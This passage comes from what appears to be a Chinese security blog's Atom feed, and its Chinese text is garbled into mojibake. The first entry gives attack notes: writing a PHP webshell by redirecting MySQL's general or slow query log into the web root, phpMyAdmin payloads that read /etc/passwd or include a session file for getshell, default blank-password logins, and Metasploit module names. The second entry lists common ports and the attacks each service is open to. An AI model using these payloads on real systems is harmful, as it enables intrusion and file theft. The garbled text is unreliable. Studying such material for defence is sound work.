æœ¬èº«åŠä»¥åçš„ç‰ˆæœ¬é»˜è®¤å€¼ä¸ºNULLï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ— å†…å®¹ã€‚</p><p>æŸ¥çœ‹å½“å‰çš„<code>secure-file-priv</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@secure_file_priv;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| NULL               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]&gt; <span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| version()  |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| 5.6.46-log |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ç”±äºmysqlåœ¨5.5.53ç‰ˆæœ¬ä¹‹åï¼Œ<code>secure-file-priv</code>çš„å€¼é»˜è®¤ä¸º<code>NULL</code>ï¼Œè¿™ä½¿å¾—æ­£å¸¸è¯»å–æ–‡ä»¶çš„æ“ä½œåŸºæœ¬ä¸å¯è¡Œã€‚æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨mysqlç”Ÿæˆæ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p><p>å¦‚æœä¸Šé¢ä¸è¡Œï¼Œå°±å¯ä»¥ç”¨æ—¥å¿—è¿›è¡Œæ”»å‡»ã€‚ï¼ˆé¢è¯•ç»å¸¸ä¼šé—®é“ã€‚</p><p>mysqlæ—¥å¿—æ–‡ä»¶çš„ä¸€äº›ç›¸å…³è®¾ç½®å¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ¥è¿›è¡Œï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//è¯·æ±‚æ—¥å¿—</span><br><span class="line">mysql&gt; set global general_log_file = &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">//æ…¢æŸ¥è¯¢æ—¥å¿—</span><br><span class="line">mysql&gt; set global slow_query_log_file=&#x27;/var/www/html/2.php&#x27;</span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">//è¿˜æœ‰å…¶ä»–å¾ˆå¤šæ—¥å¿—éƒ½å¯ä»¥è¿›è¡Œåˆ©ç”¨</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬åœ¨è®©æ•°æ®åº“æ‰§è¡Œæ»¡è¶³è®°å½•æ¡ä»¶çš„æ¶æ„è¯­å¥å³å¯ã€‚</p><p>é™åˆ¶ï¼š</p><ul><li>æƒé™å¤Ÿï¼Œå¯ä»¥è¿›è¡Œæ—¥å¿—çš„è®¾ç½®æ“ä½œ</li><li>çŸ¥é“ç›®æ ‡ç›®å½•çš„ç»å¯¹è·¯å¾„</li></ul><h3 id="å †å æ³¨å…¥Stack-Injection"><a href="#å †å æ³¨å…¥Stack-Injection" class="headerlink" title="å †å æ³¨å…¥Stack Injection"></a>å †å æ³¨å…¥Stack Injection</h3><p>PHPä¸­å †å æ³¨å…¥çš„æ”¯æŒæƒ…å†µï¼š</p><table><thead><tr><th align="left"></th><th align="left">Mysqli</th><th align="left">PDO</th><th align="left">MySQL</th></tr></thead><tbody><tr><td align="left">å¼•å…¥çš„PHPç‰ˆæœ¬</td><td align="left">5.0</td><td align="left">5.0</td><td align="left">3.0ä¹‹å‰</td></tr><tr><td align="left">PHP5.xæ˜¯å¦åŒ…å«</td><td align="left">æ˜¯</td><td align="left">æ˜¯</td><td align="left">æ˜¯</td></tr><tr><td align="left">å¤šè¯­å¥æ‰§è¡Œæ”¯æŒæƒ…å†µ</td><td align="left">æ˜¯</td><td align="left">å¤§å¤šæ•°</td><td align="left">å¦</td></tr></tbody></table><h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><ul><li>phpmyadmin2.xç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚<ul><li>æ¼æ´å±å®³ï¼šæ— éœ€ç™»å½•ï¼Œä»»æ„ä»£ç æ‰§è¡Œï¼Œä»»æ„æ–‡ä»¶è¯»å–</li><li>Payload: <code>action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></li></ul></li></ul><p>/scripts/setup.php</p><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/d68d.html">https://hack-for.fun/posts/d68d.html</a></p><ul><li>Phpmyadmin <strong>4.0.x â€“ 4.6.2</strong> RCE</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/8b82.html">https://hack-for.fun/posts/8b82.html</a></p><ul><li>Phpmyadmin<strong>4.8.1</strong> RFI</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/ef94.html">https://hack-for.fun/posts/ef94.html</a></p><p>é€šè¿‡å†™å…¥session, ç„¶ååŒ…å«session æ–‡ä»¶è¿›è¡Œgetshellã€‚</p><p>Payload:<code>index.php?target=db_sql.php%253f../../../../../tmp/sess_619cd5b47fc730f60a757f19ce6ea268</code></p><ul><li>phpmyadmin é€šç”¨å¯†ç æ¼æ´</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤ phpMyAdminï¼šç”¨æˆ·å rootã€å¯†ç  root æˆ–ç©ºç™»é™†ã€‚</span><br><span class="line"></span><br><span class="line">ç‰ˆæœ¬ 2.11.3ï½2.11.4ï¼šç”¨æˆ·å &#39;localhost&#39;@&#39;@&quot; ç™»é™†ï¼Œæ— éœ€å¯†ç ã€‚</span><br><span class="line"></span><br><span class="line">ç‰ˆæœ¬ 2.11.9.2ï¼šç”¨æˆ·å root ç™»é™†ï¼Œæ— éœ€å¯†ç ã€‚</span><br></pre></td></tr></table></figure><ul><li>å…¶ä»–ç‰ˆæœ¬æ¼æ´</li></ul><p><a href="https://blog.csdn.net/aiquan9342/article/details/102075632">https://blog.csdn.net/aiquan9342/article/details/102075632</a></p><p>ä¸€ï¼š å½±å“ç‰ˆæœ¬ï¼š3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><blockquote><p>ã€€ã€€æ¦‚è¿°ï¼šPhpMyAdminå­˜åœ¨PREG<em>REPLACE</em>EVALæ¼æ´</p><p>ã€€ã€€åˆ©ç”¨æ¨¡å—ï¼šexploit/multi/http/phpmyadmin<em>preg</em>replace CVE: CVE-2013-3238</p></blockquote><p>äºŒï¼š å½±å“ç‰ˆæœ¬ï¼šphpMyAdmin v3.5.2.2</p><blockquote><p>ã€€ã€€æ¦‚è¿°ï¼šPhpMyAdminå­˜åœ¨server<em>sync.php åé—¨æ¼æ´</em></p><p>ã€€ã€€<em>åˆ©ç”¨æ¨¡å—ï¼šexploit/multi/http/phpmyadmin</em>3522_backdoor CVE: CVE-2012-5159</p></blockquote><p>ä¸‰ï¼š å½±å“ç‰ˆæœ¬ï¼š 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;</p><blockquote><p>ã€€ã€€æ¦‚è¿°ï¼šPhpMyAdminé…ç½®æ–‡ä»¶/config/config.inc.phpå­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p><p>ã€€ã€€åˆ©ç”¨æ¨¡å—ï¼šexploit/unix/webapp/phpmyadmin_config CVE: CVE-2009-1151</p></blockquote><p>å››:å½±å“ç‰ˆæœ¬ï¼š2.11.3 / 2.11.4</p><blockquote><p>ã€€ã€€åˆ©ç”¨æ–¹æ³•ï¼šç”¨æˆ·åå¤„å†™å…¥â€˜localhostâ€™@â€˜@â€åˆ™ç™»å½•æˆåŠŸã€‚ (æ³¨æ„å…¨éƒ¨æ˜¯è‹±æ–‡æ ‡ç‚¹ç¬¦å·ï¼Œæœ€åä¸€ä¸ªä¸ºè‹±æ–‡åŒå¼•å·)</p></blockquote><p>äº”:å½±å“ç‰ˆæœ¬ï¼š2.8.0.3</p><p>ã€€ã€€phpmyadminé…åˆphpinfo getshell</p><p>ã€€ã€€<a href="https://www.t00ls.net/thread-37889-1-1.html">https://www.t00ls.net/thread-37889-1-1.html</a></p><p>é™„ä¸Šå‡ ä¸ªphpçˆ†ç»å¯¹è·¯å¾„çš„åŠæ³•ï¼š</p><blockquote><p>phpMyAdmin/libraries/select<em>lang.lib.php</em></p><p><em>phpMyAdmin/darkblue</em>orange/layout.inc.php phpMyAdmin/index.php?lang[]=1</p><p>phpmyadmin/themes/darkblue_orange/layout.inc.php</p></blockquote><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç‰¹æ€§å¾ˆå¤šï¼Œä¸€ç¯‡æ–‡ç« è‚¯å®šæ€»ç»“ä¸è¿‡æ¥ã€‚ä¸è¿‡èƒ½æ€»ç»“ä¸€äº›è¿˜æ˜¯å¥½çš„ï¼Œè‡³å°‘èƒ½å¤Ÿæ›´åŠ ç†Ÿç»ƒã€‚æ›´é‡è¦çš„æ˜¯ï¼Œå…»æˆæ€»ç»“çš„ä¹ æƒ¯ã€‚</p><blockquote><p>ä¸å®šæœŸè¡¥å……ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸€ç›´è§‰å¾—è‡ªå·±å¯¹ç›¸å…³çš„æ¼æ´å­¦çš„é©¬é©¬è™è™ï¼Œæ²¡æœ‰æ·±å…¥æ€»ç»“ï¼Œæœ€è¿‘å‡ æ¬¡CTFæ¯”èµ›ä¸­ä¹Ÿåƒäº†ä¸å°‘çš„äºã€‚é‚æƒ³èŠ±ä¸€ä¸¤å¤©çš„æ—¶é—´æ¥å¥½å¥½æ€»ç»“ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬ä¹‹é—´çš„åŒºåˆ«ï¼Œ</summary>
      
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHPå®‰å…¨" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§ç«¯å£æœåŠ¡æ¼æ´</title>
    <link href="https://hack-for.fun/e42fccb.html"/>
    <id>https://hack-for.fun/e42fccb.html</id>
    <published>2020-05-25T16:27:28.000Z</published>
    <updated>2020-10-30T13:01:06.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆ—ä¸¾"><a href="#åˆ—ä¸¾" class="headerlink" title="åˆ—ä¸¾"></a>åˆ—ä¸¾</h1><p>21    ftp/tftp/vsftpdæ–‡ä»¶ä¼ è¾“åè®®    çˆ†ç ´/å—…æ¢/æº¢å‡º/åé—¨<br>22    sshè¿œç¨‹è¿æ¥    çˆ†ç ´/opensshæ¼æ´<br>23    Telnetè¿œç¨‹è¿æ¥    çˆ†ç ´/å—…æ¢/å¼±å£ä»¤<br>25    SMTPé‚®ä»¶æœåŠ¡    é‚®ä»¶ä¼ªé€ <br>53    DNSåŸŸåè§£æç³»ç»Ÿ    åŸŸä¼ é€/åŠ«æŒ/ç¼“å­˜æŠ•æ¯’/æ¬ºéª—<br>81    Ipcam    ç™»é™†ç»•è¿‡/è¿œç¨‹ä»£ç æ‰§è¡Œ<br>110    pop3    çˆ†ç ´/å—…æ¢<br>139    SambaæœåŠ¡    çˆ†ç ´/æœªæˆæƒè®¿é—®/è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br>143    Imapåè®®    çˆ†ç ´<br>389    Ldapç›®å½•è®¿é—®åè®®    æ³¨å…¥/æœªæˆæƒè®¿é—®/å¼±å£ä»¤<br>445    smb    ms17-010/ç«¯å£æº¢å‡º<br>873    RsyncæœåŠ¡    æ–‡ä»¶ä¸Šä¼ /æœªæˆæƒè®¿é—®<br>1080    socket    çˆ†ç ´<br>1352    Lotus      dominoé‚®ä»¶æœåŠ¡    çˆ†ç ´/ä¿¡æ¯æ³„æ¼<br>1433    mssql    çˆ†ç ´/æ³¨å…¥/SAå¼±å£ä»¤<br>1521    oracle    çˆ†ç ´/æ³¨å…¥/TNSçˆ†ç ´/åå¼¹shell<br>2049    NfsæœåŠ¡    é…ç½®ä¸å½“<br>2181    zookeeperæœåŠ¡    æœªæˆæƒè®¿é—®<br>2375    docker      remote      api    æœªæˆæƒè®¿é—®<br>3306    mysql    çˆ†ç ´/æ³¨å…¥<br>3389    Rdpè¿œç¨‹æ¡Œé¢é“¾æ¥    çˆ†ç ´/shiftåé—¨<br>4440    rundeck    å¼±å£ä»¤admin<br>4848    GlassFishæ§åˆ¶å°    çˆ†ç ´/è®¤è¯ç»•è¿‡<br>5000    sybase/DB2æ•°æ®åº“    çˆ†ç ´/æ³¨å…¥/ææƒ<br>5432    postgresql    çˆ†ç ´/æ³¨å…¥/ç¼“å†²åŒºæº¢å‡º<br>5632    pcanywhereæœåŠ¡    æŠ“å¯†ç /ä»£ç æ‰§è¡Œ<br>5900    vnc    çˆ†ç ´/è®¤è¯ç»•è¿‡<br>6082    varnish    Varnish      HTTP      accelerator      CLI      æœªæˆæƒè®¿é—®<br>6379    Redisæ•°æ®åº“    æœªæˆæƒè®¿é—®/çˆ†ç ´<br>67/68    dhcpæœåŠ¡    åŠ«æŒ/æ¬ºéª—<br>8082    H2æ•°æ®åº“    å¼±å£ä»¤/ç©ºå£ä»¤<br>8161    activemq    å¼±å£ä»¤/å†™æ–‡ä»¶<br>8649    ganglia    ä¿¡æ¯æ³„æ¼<br>9000    fastcgi    è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br>9090    Websphereæ§åˆ¶å°/ç”¨å‹    çˆ†ç ´/javaååºåˆ—åŒ–/å¼±å£ä»¤<br>11211    memcached    æœªæˆæƒè®¿é—®<br>50000    SAP    SAPå‘½ä»¤æ‰§è¡Œ<br>80/443    http/https    webåº”ç”¨æ¼æ´/å¿ƒè„æ»´è¡€<br>161ï¼š162    SNMPåè®®    çˆ†ç ´/æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯<br>2601:2604    zebraè·¯ç”±è½¯ä»¶    é»˜è®¤å¯†ç zebra<br>3128ï¼š3312    squid    è¿œç¨‹ä»£ç æ‰§è¡Œ<br>7001/7002    weblogic    javaååºåˆ—åŒ–/æ§åˆ¶å°å¼±å£ä»¤<br>8083/8086    influxDB    æœªæˆæƒè®¿é—®<br>9200/9300    elasticsearch    è¿œç¨‹ä»£ç æ‰§è¡Œ<br>512/513/514    Linux      RexecæœåŠ¡    çˆ†ç ´/Rloginç™»é™†<br>61616/8161    ActiveMQ    æœªæˆæƒè®¿é—®/é»˜è®¤å¯†ç /ååºåˆ—åŒ–<br>8069/10050    zabbixæœåŠ¡    è¿œç¨‹å‘½ä»¤æ‰§è¡Œ/æ³¨å…¥<br>8000/8080/8089    Jboss/Tomcat/Resin    çˆ†ç ´/PUTæ–‡ä»¶ä¸Šä¼ /ååºåˆ—åŒ–<br>27017/27018/28017    mongodb    æœªæˆæƒè®¿é—®/çˆ†ç ´<br>8080/8088/50060:50070    hadoop    é»˜è®¤ç«¯å£æœªæˆæƒè®¿é—®</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>ç­‰æˆ‘æœ‰ç©ºï¼Œ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆ—ä¸¾&quot;&gt;&lt;a href=&quot;#åˆ—ä¸¾&quot; class=&quot;headerlink&quot; title=&quot;åˆ—ä¸¾&quot;&gt;&lt;/a&gt;åˆ—ä¸¾&lt;/h1&gt;&lt;p&gt;21    ftp/tftp/vsftpdæ–‡ä»¶ä¼ è¾“åè®®    çˆ†ç ´/å—…æ¢/æº¢å‡º/åé—¨&lt;br&gt;22    sshè¿œç¨‹è¿æ¥    çˆ†ç ´/open</summary>
      
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="ç«¯å£" scheme="https://hack-for.fun/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
</feed>
